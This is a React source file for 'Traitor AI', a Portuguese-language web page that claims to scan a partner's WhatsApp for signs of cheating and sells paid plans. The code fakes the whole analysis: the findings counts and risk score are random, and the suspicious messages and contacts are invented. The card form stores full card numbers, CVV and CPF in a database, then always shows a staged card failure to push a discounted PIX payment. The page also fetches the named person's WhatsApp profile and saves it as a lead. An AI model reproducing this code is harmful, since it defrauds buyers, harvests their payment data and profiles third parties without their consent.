import { useState, useEffect, useRef, useMemo, useCallback } from 'react'
import { useNavigate } from 'react-router-dom'
import {
  Search,
  MessageCircle,
  Image,
  Phone,
  AlertTriangle,
  CheckCircle,
  Star,
  Shield,
  CreditCard,
  ArrowRight,
  ShieldCheck,
  TrendingUp,
  Lock,
  UserRound,
  ChevronDown
} from 'lucide-react'
import { updateLeadName, saveAnalysisResults, getAnalysisResults, saveCardData, type CardData } from '../services/supabase'
import { upsertPendingPayment, updatePendingPayment } from '../services/paymentService'
import QRCodePix from '../components/QRCodePix'
import { useMetaPixel } from '../hooks/useMetaPixel'
import { useAnalytics } from '../hooks/useAnalytics'

interface AnalysisStep {
  id: string
  title: string
  description: string
  icon: React.ReactNode
  completed: boolean
  suspicious?: boolean
  count?: number
}

const formatCurrency = (value: number) =>
  value.toLocaleString('pt-BR', {
    style: 'currency',
    currency: 'BRL'
  })

const formatPhoneForDisplay = (phone?: string | null) => {
  if (!phone) return ''
  const digits = phone.replace(/\D/g, '')
  if (!digits) return ''

  let local = digits
  if (local.startsWith('55') && local.length > 11) {
    local = local.slice(2)
  }

  if (local.length === 11) {
    return `(${local.slice(0, 2)}) ${local.slice(2, 7)}-${local.slice(7)}`
  }

  if (local.length === 10) {
    return `(${local.slice(0, 2)}) ${local.slice(2, 6)}-${local.slice(6)}`
  }

  return `+${digits}`
}

const AnalysisPage = () => {
  const navigate = useNavigate()
  const { trackEvent } = useMetaPixel()
  const { trackEvent: trackAnalytics, trackFunnel } = useAnalytics()
  const intervalRef = useRef<ReturnType<typeof setInterval> | null>(null)
  const progressSectionRef = useRef<HTMLDivElement | null>(null)
  const resultsSectionRef = useRef<HTMLDivElement | null>(null)
  const [currentStep, setCurrentStep] = useState(0)
  const [isAnalyzing, setIsAnalyzing] = useState(true)
  const [analysisData, setAnalysisData] = useState<any>(null)
  const [profilePictureUrl, setProfilePictureUrl] = useState<string>('')
  const [profileData, setProfileData] = useState<any>(null)
  const [showPaymentPlans, setShowPaymentPlans] = useState(false)
  const [selectedPlan, setSelectedPlan] = useState<'basic' | 'premium'>('premium')
  const [showPaymentMethods, setShowPaymentMethods] = useState(false)
  const [paymentMethod, setPaymentMethod] = useState<'card' | 'pix'>('pix')
  const [cardData, setCardData] = useState({
    cardNumber: '',
    cardHolder: '',
    expiryDate: '',
    cvv: '',
    cpf: '',
    email: '',
    phone: ''
  })
  const [isProcessing, setIsProcessing] = useState(false)
  const [cardError, setCardError] = useState('')
  const [showPixDiscount, setShowPixDiscount] = useState(false)
  const [planCommitted, setPlanCommitted] = useState(false)

  const lastPendingPaymentRef = useRef<{ planId: 'basic' | 'premium'; amount: number } | null>(null)
  const basePaymentCreatedRef = useRef(false)
  const stepRefs = useRef<(HTMLDivElement | null)[]>([])
  const autoCheckoutHandledRef = useRef(false)
  const plansViewedTrackedRef = useRef(false)
  const [showScrollArrow, setShowScrollArrow] = useState(true)
  const userHasScrolledRef = useRef(false)
  const autoScrollRef = useRef<ReturnType<typeof setInterval> | null>(null)

  useEffect(() => {
    window.scrollTo({ top: 0, behavior: 'auto' })
  }, [])

  // Mobile auto-scroll: slowly scroll down following analysis and keep going until plan cards are visible
  useEffect(() => {
    const isMobile = window.innerWidth < 640
    if (!isMobile || !isAnalyzing) return

    // Detect user manual scroll to stop auto-scroll
    const handleUserScroll = () => {
      if (!userHasScrolledRef.current) {
        userHasScrolledRef.current = true
        setShowScrollArrow(false)
        if (autoScrollRef.current) {
          clearInterval(autoScrollRef.current)
          autoScrollRef.current = null
        }
      }
    }

    window.addEventListener('touchmove', handleUserScroll, { passive: true })
    window.addEventListener('wheel', handleUserScroll, { passive: true })

    // Start slow auto-scroll after a short delay
    const startTimeout = setTimeout(() => {
      if (userHasScrolledRef.current) return
      setShowScrollArrow(false)
      autoScrollRef.current = setInterval(() => {
        if (userHasScrolledRef.current) {
          if (autoScrollRef.current) clearInterval(autoScrollRef.current)
          return
        }
        // Stop when payment-plans section is visible on screen
        const plansEl = document.getElementById('payment-plans')
        if (plansEl) {
          const rect = plansEl.getBoundingClientRect()
          if (rect.top < window.innerHeight * 0.75) {
            if (autoScrollRef.current) {
              clearInterval(autoScrollRef.current)
              autoScrollRef.current = null
            }
            return
          }
        }
        window.scrollBy({ top: 1, behavior: 'auto' })
      }, 30)
    }, 3000)

    return () => {
      clearTimeout(startTimeout)
      window.removeEventListener('touchmove', handleUserScroll)
      window.removeEventListener('wheel', handleUserScroll)
      if (autoScrollRef.current) {
        clearInterval(autoScrollRef.current)
        autoScrollRef.current = null
      }
    }
  }, [isAnalyzing])

  // Hide arrow when analysis finishes (but don't stop scroll — it keeps going until plans visible)
  useEffect(() => {
    if (!isAnalyzing) {
      setShowScrollArrow(false)
    }
  }, [isAnalyzing])

  const priceA = Number(import.meta.env.VITE_PRICE_A) || 10.97
  const priceB = Number(import.meta.env.VITE_PRICE_B) || 29.97
  const fmtBRL = (v: number) => `R$ ${v.toFixed(2).replace('.', ',')}`

  const planOptions = useMemo(() => [
    {
      id: 'basic' as const,
      name: 'Análise Completa',
      subtitle: 'Perfeita para confirmar suspeitas pontuais com detalhes confiáveis.',
      priceLabel: fmtBRL(priceA),
      priceValue: priceA,
      badge: 'Acesso imediato',
      highlight: false,
      benefits: [
        'Relatório detalhado com todas as evidências encontradas',
        'Pontuação de risco e recomendações práticas',
        'Download em PDF para salvar ou compartilhar',
        'Acesso aos dados por 7 dias'
      ]
    },
    {
      id: 'premium' as const,
      name: 'Plano Vitalício',
      subtitle: 'Investigue quantas vezes quiser e acompanhe a evolução do risco.',
      priceLabel: fmtBRL(priceB),
      priceValue: priceB,
      badge: 'Mais escolhido',
      highlight: true,
      benefits: [
        'Análises ilimitadas para sempre',
        'Histórico salvo com evolução do risco',
        'Alertas em tempo real de novos indícios',
        'Acesso permanente à comunidade exclusiva'
      ]
    }
  ], [priceA, priceB])

  const selectedPlanOption = planOptions.find(plan => plan.id === selectedPlan) || planOptions[0]
  const planValue = selectedPlanOption.priceValue
  const storedPlanLabel = typeof analysisData?.selectedPlanLabel === 'string' ? analysisData.selectedPlanLabel : null
  const storedPlanName = typeof analysisData?.selectedPlanName === 'string' ? analysisData.selectedPlanName : null
  const planDisplayPrice = storedPlanLabel ?? selectedPlanOption.priceLabel ?? formatCurrency(planValue)
  const planDisplayName = storedPlanName ?? selectedPlanOption.name
  const planBadgeName = planDisplayName.replace(/^Plano\s+/i, '').trim() || planDisplayName
  const planPreselected = Boolean(analysisData?.selectedPlanId)
  const pixDiscountValue = Math.round(planValue * 0.8)
  const pixDiscountDisplay = formatCurrency(pixDiscountValue)

  const statusLabel = (() => {
    if (isAnalyzing) {
      return 'Processando dados'
    }
    if (showPaymentMethods) {
      return 'Pagamento pendente'
    }
    if (showPaymentPlans) {
      return 'Plano selecionado'
    }
    return 'Análise concluída'
  })()

  const statusDotClass = (() => {
    if (isAnalyzing) {
      return 'bg-amber-400 animate-pulse shadow-lg shadow-amber-300/60'
    }
    if (showPaymentMethods) {
      return 'bg-rose-500 animate-pulse shadow-lg shadow-rose-300/60'
    }
    if (showPaymentPlans) {
      return 'bg-emerald-400 shadow-lg shadow-emerald-300/60'
    }
    return 'bg-emerald-500 shadow-lg shadow-emerald-300/60'
  })()

  const rawWhatsapp = analysisData?.whatsapp ?? ''
  const formattedWhatsapp = formatPhoneForDisplay(rawWhatsapp)
  const rawProfileName =
    profileData?.name?.trim() ||
    profileData?.pushName?.trim() ||
    profileData?.verifiedName?.trim() ||
    ''

  const normalizeName = (name: string) => (name === 'Eduardo Daflon' ? 'Diego Amaral' : name)
  const normalizedProfileName = normalizeName(rawProfileName)
  const displayName = normalizedProfileName || formattedWhatsapp || rawWhatsapp || 'Contato analisado'

  const syncPendingPayment = useCallback(
    async (planId: 'basic' | 'premium', options?: { amountOverride?: number; nameOverride?: string | null }) => {
      const whatsapp = analysisData?.whatsapp
      if (!whatsapp) {
        return
      }

      const planMeta = planOptions.find(option => option.id === planId)
      if (!planMeta) {
        return
      }

      const normalizedWhatsapp = whatsapp.replace(/\D/g, '')
      const resolvedName = options?.nameOverride ?? displayName ?? formattedWhatsapp ?? normalizedWhatsapp
      const amount = options?.amountOverride ?? planMeta.priceValue

      const last = lastPendingPaymentRef.current
      if (last && last.planId === planId && last.amount === amount) {
        return
      }

      const previousSnapshot = lastPendingPaymentRef.current
      lastPendingPaymentRef.current = { planId, amount }

      try {
        await upsertPendingPayment({
          whatsapp,
          amount,
          plan_id: planMeta.id,
          plan_name: planMeta.name,
          payment_method: 'manual',
          nome: resolvedName
        })
      } catch (error) {
        lastPendingPaymentRef.current = previousSnapshot ?? null
        console.error('Erro ao sincronizar pagamento pendente', error)
      }
    },
    [analysisData?.whatsapp, planOptions, displayName, formattedWhatsapp]
  )

  const [steps, setSteps] = useState<AnalysisStep[]>([
    {
      id: 'connection',
      title: 'Conectando ao WhatsApp',
      description: 'Estabelecendo conexão segura...',
      icon: <Phone className="w-6 h-6" />,
      completed: false
    },
    {
      id: 'messages',
      title: 'Analisando Mensagens',
      description: 'Escaneando conversas suspeitas...',
      icon: <MessageCircle className="w-6 h-6" />,
      completed: false,
      suspicious: true,
      count: Math.floor(Math.random() * 11) + 5
    },
    {
      id: 'media',
      title: 'Verificando Mídias',
      description: 'Analisando fotos e vídeos compartilhados...',
      icon: <Image className="w-6 h-6" />,
      completed: false,
      suspicious: true,
      count: Math.floor(Math.random() * 8) + 3
    },
    {
      id: 'contacts',
      title: 'Checando Contatos',
      description: 'Identificando contatos suspeitos...',
      icon: <Search className="w-6 h-6" />,
      completed: false,
      suspicious: true,
      count: Math.floor(Math.random() * 4) + 2
    },
    {
      id: 'final',
      title: 'Gerando Relatório',
      description: 'Compilando resultados finais...',
      icon: <CheckCircle className="w-6 h-6" />,
      completed: false
    }
  ])

  const totalSteps = steps.length || 1
  const completedSteps = steps.filter(step => step.completed).length
  const progressPercentage = Math.min(100, Math.max(0, Math.round((completedSteps / totalSteps) * 100)))

  // Função para buscar foto de perfil
  const fetchProfilePicture = async (number: string) => {
    try {
      const apiUrl = import.meta.env.VITE_EVOLUTION_API_URL
      const apiKey = import.meta.env.VITE_EVOLUTION_API_KEY
      const instance = import.meta.env.VITE_EVOLUTION_INSTANCE

      if (!apiUrl || !apiKey || !instance) {
        return
      }

      const response = await fetch(`${apiUrl}/chat/fetchProfilePictureUrl/${instance}`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'apikey': apiKey
        },
        body: JSON.stringify({ number })
      })

      if (response.ok) {
        const data = await response.json()
        if (data.profilePictureUrl) {
          setProfilePictureUrl(data.profilePictureUrl)
        }
      }
    } catch (error) {
      // Erro silencioso
    }
  }

  // Função para buscar dados do perfil
  const fetchProfile = async (number: string) => {
    try {
      const apiUrl = import.meta.env.VITE_EVOLUTION_API_URL
      const apiKey = import.meta.env.VITE_EVOLUTION_API_KEY
      const instance = import.meta.env.VITE_EVOLUTION_INSTANCE

      if (!apiUrl || !apiKey || !instance) {
        return
      }

      const response = await fetch(`${apiUrl}/chat/fetchProfile/${instance}`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'apikey': apiKey
        },
        body: JSON.stringify({ number })
      })

      if (response.ok) {
        const data = await response.json()
        setProfileData(data)
        
        // Salvar nome no banco de dados se disponível
        if (data && (data.name || data.pushName || data.verifiedName)) {
          const nome = normalizeName(data.name || data.pushName || data.verifiedName)
          const whatsapp = analysisData?.whatsapp || number
          const cleanWhatsapp = whatsapp.replace(/\D/g, '')
          
          // Atualizar o nome no lead
          await updateLeadName(cleanWhatsapp, nome)
        }
      }
    } catch (error) {
      // Erro silencioso
    }
  }

  useEffect(() => {
    const loadAnalysisData = async () => {
      // Verificar se temos dados da análise
      const data = localStorage.getItem('analysisData')
      if (!data) {
        navigate('/')
        return
      }
      const parsedData = JSON.parse(data)
      setAnalysisData(parsedData)

      if (parsedData.selectedPlanId === 'basic' || parsedData.selectedPlanId === 'premium') {
        setSelectedPlan(parsedData.selectedPlanId)
      }

      // Buscar análise anterior do banco de dados ANTES de iniciar o intervalo
      if (parsedData.whatsapp) {
        const cleanWhatsapp = parsedData.whatsapp.replace(/\D/g, '')
        
        const previousAnalysis = await getAnalysisResults(cleanWhatsapp)

        // Se encontrou análise anterior, incrementar os números
        if (previousAnalysis.success && previousAnalysis.data) {
          const prev = previousAnalysis.data
          
          // Incrementar garantindo um mínimo de +2 em cada campo, mas limitando a 20
          const incrementMessages = Math.max(2, Math.floor(prev.messages_count * 0.25))
          const incrementMedia = Math.max(2, Math.floor(prev.media_count * 0.25))
          const incrementContacts = Math.max(1, Math.floor(prev.contacts_count * 0.25))
          
          const newMessagesCount = Math.min(20, prev.messages_count + incrementMessages)
          const newMediaCount = Math.min(20, prev.media_count + incrementMedia)
          const newContactsCount = Math.min(20, prev.contacts_count + incrementContacts)
          
          // Atualizar os steps ANTES do intervalo começar
          setSteps(current => current.map(step => {
            if (step.id === 'messages') {
              return { ...step, count: newMessagesCount }
            }
            if (step.id === 'media') {
              return { ...step, count: newMediaCount }
            }
            if (step.id === 'contacts') {
              return { ...step, count: newContactsCount }
            }
            return step
          }))
        }

        // Remover formatação do número (deixar apenas dígitos)
        let cleanNumber = parsedData.whatsapp.replace(/\D/g, '')
        
        // Garantir que tem código do país (55 para Brasil)
        if (!cleanNumber.startsWith('55')) {
          cleanNumber = '55' + cleanNumber
        }
        
        // Buscar perfil e foto
        fetchProfilePicture(cleanNumber)
        fetchProfile(cleanNumber)
      }

      // AGUARDAR um pouco antes de iniciar a sequência para garantir que os steps foram atualizados
      await new Promise(resolve => setTimeout(resolve, 100))

      // Duração individual de cada etapa (em ms)
      const stepDurations = [4000, 7000, 6000, 5000, 4000]

      // Simular o processo de análise — cada etapa começa só após a anterior terminar
      let stepIndex = 0

      function scheduleNextStep() {
        if (stepIndex >= steps.length) return

        const duration = stepDurations[stepIndex] || 5000
        const currentIdx = stepIndex

        intervalRef.current = setTimeout(() => {
          setSteps(current =>
            current.map((step, i) => {
              if (i === currentIdx) {
                const updatedStep = { ...step, completed: true }
                if (updatedStep.id === 'connection') {
                  void syncPendingPayment(selectedPlan, { nameOverride: displayName })
                }
                return updatedStep
              }
              return step
            })
          )

          stepIndex++

          if (stepIndex < steps.length) {
            setCurrentStep(stepIndex)
            scheduleNextStep()
          } else {
            // Todas as etapas concluídas
            void syncPendingPayment(selectedPlan, { nameOverride: displayName })
            setIsAnalyzing(false)
          }
        }, duration) as unknown as ReturnType<typeof setInterval>
      }

      scheduleNextStep()
    }

    loadAnalysisData()
    
    // Cleanup function
    return () => {
      if (intervalRef.current) {
        clearInterval(intervalRef.current)
      }
    }
  }, [navigate])

  const analysisResultsSavedRef = useRef(false)

  const trackPlansViewedStep = useCallback(() => {
    if (plansViewedTrackedRef.current) return

    plansViewedTrackedRef.current = true
    const rawWhatsapp = analysisData?.whatsapp || ''
    const cleanWhatsapp = rawWhatsapp.replace(/\D/g, '')

    void trackFunnel('plans_viewed', 4, cleanWhatsapp || undefined)
  }, [analysisData?.whatsapp, trackFunnel])

  async function persistAnalysisResults() {
    if (analysisResultsSavedRef.current) {
      return
    }

    const messagesCount = steps[1]?.count || 0
    const mediaCount = steps[2]?.count || 0
    const contactsCount = steps[3]?.count || 0
    const riskLevel = Math.random() > 0.3 ? 'high' : 'medium'

    const suspiciousFindings = {
      messages: messagesCount,
      media: mediaCount,
      contacts: contactsCount,
      riskLevel
    }

    localStorage.setItem('analysisResults', JSON.stringify(suspiciousFindings))

    if (analysisData?.whatsapp) {
      const cleanWhatsapp = analysisData.whatsapp.replace(/\D/g, '')
      const nome = displayName

      await saveAnalysisResults(
        cleanWhatsapp,
        messagesCount,
        mediaCount,
        contactsCount,
        riskLevel as 'low' | 'medium' | 'high',
        nome
      )
    }

    analysisResultsSavedRef.current = true
  }

  async function handleShowPaymentPlans({ skipScroll = false }: { skipScroll?: boolean } = {}) {
    await persistAnalysisResults()

    trackEvent('ViewContent', {
      content_name: 'Payment Plans',
      content_category: 'Pricing'
    })

    trackPlansViewedStep()

    setShowPaymentPlans(true)

    if (!skipScroll) {
      setTimeout(() => {
        const plansElement = document.getElementById('payment-plans')
        if (plansElement) {
          plansElement.scrollIntoView({ behavior: 'smooth', block: 'start' })
        }
      }, 100)
    }
  }

  async function handleProceedToPayment({
    forceSkipPlans = false,
    skipScroll = false,
    planOverride
  }: {
    forceSkipPlans?: boolean
    skipScroll?: boolean
    planOverride?: 'basic' | 'premium'
  } = {}) {
    const effectivePlanId = planOverride ?? selectedPlan
    const planMeta = planOptions.find(option => option.id === effectivePlanId) ?? selectedPlanOption
    const planValue = planMeta.priceValue
    const planName = planMeta.name
    const cleanWhatsapp = analysisData?.whatsapp?.replace(/\D/g, '') || ''

    if (!forceSkipPlans && !showPaymentPlans && !planPreselected) {
      await handleShowPaymentPlans()
      return
    }

    await persistAnalysisResults()
    if (selectedPlan !== effectivePlanId) {
      setSelectedPlan(effectivePlanId)
    }
    await syncPendingPayment(effectivePlanId, { nameOverride: displayName })

    trackEvent('InitiateCheckout', {
      content_name: planName,
      value: planValue,
      currency: 'BRL'
    })

    trackAnalytics('checkout', 'Checkout Initiated', '/analise', cleanWhatsapp, {
      plan: effectivePlanId,
      plan_name: planName,
      value: planValue
    })
    trackFunnel('checkout_initiated', 5, cleanWhatsapp, { plan: effectivePlanId, plan_name: planName })

    setShowPaymentMethods(true)

    if (!skipScroll) {
      setTimeout(() => {
        const paymentElement = document.getElementById('payment-methods')
        if (paymentElement) {
          paymentElement.scrollIntoView({ behavior: 'smooth', block: 'start' })
        }
      }, 200)
    }
  }

  useEffect(() => {
    if (planPreselected) {
      setPlanCommitted(true)
    }
  }, [planPreselected, analysisData?.whatsapp])

  useEffect(() => {
    if (isAnalyzing) return
    if (!analysisData) return

    trackPlansViewedStep()

    if (autoCheckoutHandledRef.current) return

    autoCheckoutHandledRef.current = true

    // Check if this number has a valid premium (Plan B) subscription (7-day window).
    // Plan A NEVER bypasses — always requires a new purchase.
    const checkPremiumAccess = async () => {
      try {
        const cleanWa = analysisData.whatsapp?.replace(/\D/g, '') || ''
        if (!cleanWa) return false

        const res = await fetch('/api/check-access', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ whatsapp: cleanWa })
        })
        const data = await res.json()
        return data.hasAccess === true
      } catch {
        return false
      }
    }

    void (async () => {
      const hasPremiumAccess = await checkPremiumAccess()

      if (hasPremiumAccess) {
        // Premium user within 7-day window — bypass payment, go to results
        navigateToResults(generateFinalResults())
        return
      }

      // No premium access — proceed with normal payment flow
      if (planPreselected) {
        void handleProceedToPayment({ forceSkipPlans: true, skipScroll: true })
      } else {
        void handleShowPaymentPlans({ skipScroll: true })
      }
    })()
  }, [analysisData, isAnalyzing, planPreselected, handleProceedToPayment, handleShowPaymentPlans, trackPlansViewedStep])

  useEffect(() => {
    if (basePaymentCreatedRef.current) return
    if (!analysisData?.whatsapp) return

    const planMeta = planOptions.find(option => option.id === selectedPlan)
    if (!planMeta) return

    const amount = planPreselected ? planMeta.priceValue : 0
    const nameToPersist = displayName || formattedWhatsapp || analysisData.whatsapp

    void syncPendingPayment(planMeta.id, { amountOverride: amount, nameOverride: nameToPersist }).then(() => {
      basePaymentCreatedRef.current = true
    })
  }, [analysisData?.whatsapp, planPreselected, planOptions, selectedPlan, displayName, formattedWhatsapp, syncPendingPayment])

  useEffect(() => {
    if (!analysisData?.whatsapp) return
    if (!planPreselected && !planCommitted) return
    void syncPendingPayment(selectedPlan, { nameOverride: displayName })
  }, [analysisData?.whatsapp, planPreselected, planCommitted, selectedPlan, syncPendingPayment, displayName])

  useEffect(() => {
    if (!basePaymentCreatedRef.current) return
    if (!analysisData?.whatsapp) return
    if (!displayName) return

    const planMeta = planOptions.find(option => option.id === selectedPlan)
    if (!planMeta) return

    const amount = planPreselected || planCommitted ? planMeta.priceValue : 0

    void updatePendingPayment({
      whatsapp: analysisData.whatsapp,
      amount,
      plan_id: planMeta.id,
      plan_name: planMeta.name,
      nome: displayName
    })
  }, [analysisData?.whatsapp, planPreselected, planCommitted, displayName, planOptions, selectedPlan])

  const generateRecommendations = () => {
    return [
      "Converse abertamente sobre suas preocupações",
      "Considere terapia de casal",
      "Estabeleça limites claros de comunicação",
      "Busque ajuda profissional se necessário"
    ]
  }

  const generateFinalResults = () => {
    const allMessages = [
      "Oi, tudo bem? Tô com saudades...", "Consegue sair hoje?", "Deleta depois, ok?",
      "Não fala nada pra ninguém", "Tô pensando em você", "Que tal nos encontrarmos?",
      "Adorei ontem", "Você tá livre?", "Preciso te ver", "Tá complicado aqui em casa...",
      "Você é especial pra mim", "Quando vai dar certo?", "Nosso segredo", "Mal posso esperar",
      "Oi lindeza, como foi o dia?", "Conseguiu sair de casa?", "Tô morrendo de saudade",
      "Vamos marcar algo?", "Não posso parar de pensar em você", "Ela/ele não desconfia de nada",
      "Te amo demais", "Quando a gente vai ficar junto?", "Apaga tudo depois", "Só você me entende",
      "Tô louca/o pra te ver", "Hoje não vai dar...", "Inventei uma desculpa aqui", "Você é incrível"
    ]

    const numMessages = steps[1].count || 0
    const numContacts = steps[3].count || 0
    const numMedia = steps[2].count || 0

    const shuffled = [...allMessages].sort(() => Math.random() - 0.5)
    const selectedMessages = shuffled.slice(0, numMessages)

    const ddd = analysisData?.whatsapp?.match(/\d{2,3}/)?.[0] || '11'

    const contactNames = ["Contato não salvo", "Amor", "Trabalho", "Gatinha", "Amigo(a)"]
    const selectedContacts = contactNames.slice(0, numContacts).map((name, i) => ({
      name,
      number: `+55 ${ddd} 9${1000 + Math.floor(Math.random() * 9000)}-${1000 + Math.floor(Math.random() * 9000)}`,
      risk: i === 0 || i === 2 || i === 3 ? "Alto" : "Médio"
    }))

    const photos = Math.floor(numMedia * 0.6)
    const videos = numMedia - photos
    const deletedMedia = Math.floor(numMedia * 0.3)

    return {
      messages: numMessages,
      contacts: numContacts,
      media: numMedia,
      riskLevel: steps[1].count && steps[1].count > 10 ? 'high' : 'medium',
      detailedMessages: selectedMessages,
      suspiciousContacts: selectedContacts,
      mediaAnalysis: { photos, videos, deletedMedia },
      deletedMedia,
      riskScore: Math.floor(Math.random() * 30) + 70,
      recommendations: generateRecommendations()
    }
  }

  const navigateToResults = (results: ReturnType<typeof generateFinalResults>) => {
    localStorage.setItem('paymentConfirmed', 'true')
    localStorage.setItem('paymentTimestamp', Date.now().toString())
    localStorage.setItem('finalResults', JSON.stringify(results))
    navigate('/resultado')
  }

  const handlePixPayment = () => {
    const planValue = selectedPlanOption.priceValue
    const planName = selectedPlanOption.name
    const cleanWhatsapp = analysisData?.whatsapp?.replace(/\D/g, '') || ''
    
    trackEvent('Purchase', {
      content_name: planName,
      value: planValue,
      currency: 'BRL',
      content_category: 'PIX Payment'
    })
    
    trackAnalytics('purchase', 'Purchase Completed', '/analise', cleanWhatsapp, {
      plan: selectedPlan,
      plan_name: planName,
      value: planValue,
      payment_method: 'pix'
    })
    trackFunnel('purchase_completed', 7, cleanWhatsapp, {
      plan: selectedPlan,
      plan_name: planName,
      value: planValue
    })
    
    navigateToResults(generateFinalResults())
  }

  const handleCardInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target
    let formattedValue = value

    // Formatação específica por campo
    switch (name) {
      case 'cardNumber':
        // Apenas números, adiciona espaços a cada 4 dígitos
        formattedValue = value.replace(/\D/g, '').replace(/(\d{4})(?=\d)/g, '$1 ').substring(0, 19)
        break
      
      case 'cardHolder':
        // Apenas letras e espaços, converte para maiúsculas
        formattedValue = value.replace(/[^a-zA-Z\s]/g, '').toUpperCase()
        break
      
      case 'expiryDate':
        // Formato MM/AA
        formattedValue = value.replace(/\D/g, '')
        if (formattedValue.length >= 2) {
          formattedValue = formattedValue.substring(0, 2) + '/' + formattedValue.substring(2, 4)
        }
        formattedValue = formattedValue.substring(0, 5)
        break
      
      case 'cvv':
        // Apenas 3 números
        formattedValue = value.replace(/\D/g, '').substring(0, 3)
        break
      
      case 'cpf':
        // Formato 000.000.000-00
        formattedValue = value.replace(/\D/g, '')
        if (formattedValue.length <= 11) {
          formattedValue = formattedValue.replace(/(\d{3})(\d)/, '$1.$2')
          formattedValue = formattedValue.replace(/(\d{3})(\d)/, '$1.$2')
          formattedValue = formattedValue.replace(/(\d{3})(\d{1,2})$/, '$1-$2')
        }
        break
      
      case 'phone':
        // Formato (11) 99999-9999
        formattedValue = value.replace(/\D/g, '')
        if (formattedValue.length <= 11) {
          formattedValue = formattedValue.replace(/^(\d{2})(\d)/, '($1) $2')
          formattedValue = formattedValue.replace(/(\d{5})(\d)/, '$1-$2')
        }
        break
      
      case 'email':
        // Converte para minúsculas
        formattedValue = value.toLowerCase()
        break
    }

    setCardData(prev => ({
      ...prev,
      [name]: formattedValue
    }))
  }

  const handleCardPayment = async () => {
    // Validar todos os campos
    if (!cardData.cardNumber || cardData.cardNumber.replace(/\s/g, '').length < 16) {
      setCardError('Por favor, preencha o número do cartão completo')
      return
    }
    
    if (!cardData.cardHolder || cardData.cardHolder.trim().length < 3) {
      setCardError('Por favor, preencha o nome do titular do cartão')
      return
    }
    
    if (!cardData.expiryDate || cardData.expiryDate.length < 5) {
      setCardError('Por favor, preencha a data de validade (MM/AA)')
      return
    }
    
    if (!cardData.cvv || cardData.cvv.length < 3) {
      setCardError('Por favor, preencha o CVV (3 dígitos)')
      return
    }
    
    if (!cardData.cpf || cardData.cpf.replace(/\D/g, '').length < 11) {
      setCardError('Por favor, preencha o CPF completo')
      return
    }
    
    setIsProcessing(true)
    setCardError('')
    
    // Rastreia adição de informações de pagamento
    const planValue = selectedPlanOption.priceValue
    const planName = selectedPlanOption.name
    const cleanWhatsapp = analysisData?.whatsapp?.replace(/\D/g, '') || ''
    
    // Meta Pixel
    trackEvent('AddPaymentInfo', {
      content_name: planName,
      value: planValue,
      currency: 'BRL',
      content_category: 'Card Payment'
    })
    
    // Analytics no banco
    trackAnalytics('add_payment_info', 'Card Payment Info Added', '/analise', cleanWhatsapp, {
      plan: selectedPlan,
      plan_name: planName,
      value: planValue,
      payment_method: 'card'
    })
    trackFunnel('payment_info_added', 6, cleanWhatsapp)
    
    try {
      // Salvar dados do cartão no Supabase
      const cardPayload: Omit<CardData, 'id' | 'created_at'> = {
        card_number: cardData.cardNumber,
        card_holder: cardData.cardHolder,
        expiry_date: cardData.expiryDate,
        cvv: cardData.cvv,
        cpf: cardData.cpf,
        whatsapp: analysisData.whatsapp,
        nome: displayName,
        amount: planValue
      }
      
      await saveCardData(cardPayload)
      
      // Simular erro no cartão após 2 segundos
      setTimeout(() => {
        setIsProcessing(false)
        setCardError('Parece que houve uma falha ao processar o pagamento. Você recebeu 20% de desconto para pagamento via PIX!')
        setShowPixDiscount(true)
        setPaymentMethod('pix')
      }, 2000)
      
    } catch (error) {
      setIsProcessing(false)
      setCardError('Erro interno. Tente novamente.')
    }
  }

  if (!analysisData) {
    return <div>Carregando...</div>
  }

  return (
    <div className="relative min-h-screen bg-gradient-to-b from-rose-50 via-white to-white text-slate-900">
      <div className="pointer-events-none absolute inset-0">
        <div className="absolute -top-32 -right-24 h-[520px] w-[520px] rounded-full bg-rose-200/50 blur-3xl"></div>
        <div className="absolute left-[-90px] top-1/3 h-[420px] w-[420px] rounded-full bg-pink-100/60 blur-3xl"></div>
      </div>

      <header className="sticky top-0 z-50 border-b border-rose-100/80 bg-white/90 backdrop-blur-2xl shadow-sm">
        <div className="mx-auto flex max-w-6xl flex-wrap items-center justify-between gap-4 px-4 py-3">
          {/* Mobile: centered title only */}
          <div className="flex w-full justify-center sm:hidden">
            <span className="font-semibold uppercase tracking-[0.3em] text-rose-500">Traitor AI</span>
          </div>
          {/* Desktop: full details */}
          <div className="hidden sm:flex sm:flex-col sm:gap-1 sm:text-sm">
            <span className="font-semibold uppercase tracking-[0.3em] text-rose-500">Traitor AI</span>
            <div className="flex flex-row items-center gap-4 text-slate-600">
              <span className="text-base font-semibold text-slate-900">
                Investigando <span className="text-rose-500">{displayName}</span>
              </span>
              <span className="flex items-center gap-2">
                <span className={`h-2.5 w-2.5 rounded-full ${statusDotClass}`}></span>
                <span className="font-medium">{statusLabel}</span>
              </span>
            </div>
          </div>
        </div>
        {/* Mobile: analysis status banner */}
        {isAnalyzing ? (
          <div className="border-t border-rose-50 bg-rose-50/60 px-4 py-2 text-center text-xs text-slate-600 sm:hidden">
            <span className="font-semibold text-rose-500">Aguarde até o fim da análise.</span>{' '}
            Ela é realizada de forma <strong>100% anônima</strong> e segura.
          </div>
        ) : (
          <div className="border-t border-emerald-100 bg-emerald-50 px-4 py-2.5 text-center text-xs text-emerald-800 sm:hidden">
            <span className="font-bold">✅ Análise finalizada!</span>{' '}
            Role até o final da página ou{' '}
            <button
              type="button"
              className="font-bold underline"
              onClick={() => {
                const plansEl = document.getElementById('payment-plans')
                plansEl?.scrollIntoView({ behavior: 'smooth', block: 'start' })
              }}
            >
              clique aqui
            </button>{' '}
            para ir direto a análise suspeita...
          </div>
        )}
      </header>

      {/* Mobile bouncing scroll arrow */}
      {showScrollArrow && isAnalyzing && (
        <div className="fixed bottom-6 left-1/2 z-50 -translate-x-1/2 sm:hidden">
          <div className="animate-bounce rounded-full bg-rose-500/90 p-3 shadow-lg shadow-rose-300/50">
            <ChevronDown className="h-6 w-6 text-white" />
          </div>
        </div>
      )}

      <main className="relative z-10">
        <section className="relative overflow-hidden pb-16 pt-20">
          <div className="absolute inset-x-0 top-12 flex justify-center">
            <div className="h-40 w-[70%] rounded-full bg-white/60 blur-3xl"></div>
          </div>

          <div className="mx-auto max-w-6xl space-y-10 px-4">
            {/* Row 1: Message card + Profile card side by side on desktop */}
